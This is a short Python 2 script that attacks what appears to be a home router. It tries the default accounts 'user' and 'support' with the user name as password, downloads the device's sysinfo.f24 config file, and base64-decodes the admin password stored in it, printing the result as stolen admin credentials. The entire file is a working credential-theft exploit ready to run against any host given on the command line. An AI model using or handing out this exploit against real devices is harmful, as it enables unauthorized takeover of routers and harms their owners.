import urllib2, base64, sys

class Target(object):
	def __init__(self, host,user):
		self.host = host
		self.username = user
		self.password = user
		self.config = ""

	def getConfigFile(self):

		print "[+] Trying to fetch config file from "+host
		request = urllib2.Request(host+"sysinfo.f24")
		base64string = base64.encodestring('%s:%s' % (self.username, self.password)).replace('\n', '')
		request.add_header("Authorization", "Basic %s" % base64string)
		try:  
			result = urllib2.urlopen(request)
		except:
			print "[-] Could not make request with user \""+self.username+"\""
			return 2
		self.config = result.read()
		
		if "PSI config:" not in self.config:
			print "[-] Unable to download config file... Closing"
			return 1
		else:
			print "[+] Successfuly device's config file"
			return 0

	def getAdmin(self):
		print "[+] Parsing XML file"
		beg = self.config.find("<AdminPassword>")
		beg = beg+15
		end = self.config.find("</AdminPassword>")
		password = self.config[beg:end]
		print "[+] Decoding admin password"
		admin = base64.decodestring(password)[0:4]
		print "\n\n[+] Admin credentials:\tadmin:"+admin+"\n\n"

def main():
	print "[+] Trying with default user \"user\" "
	target = Target(host,"user")
	opp = target.getConfigFile()
	if opp == 0:
		target.getAdmin()
	elif opp == 2:
		print "[+] Trying with default user \"support\""
		target = Target(host,"support")
		opp = target.getConfigFile()
		if opp == 0:
			target.getAdmin()


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
		if "://" not in host:
			host = "http://"+host
		if host[len(host)-1] != "/":
			host = host+"/"
	else:
		host = "http://192.168.1.1/"
	main()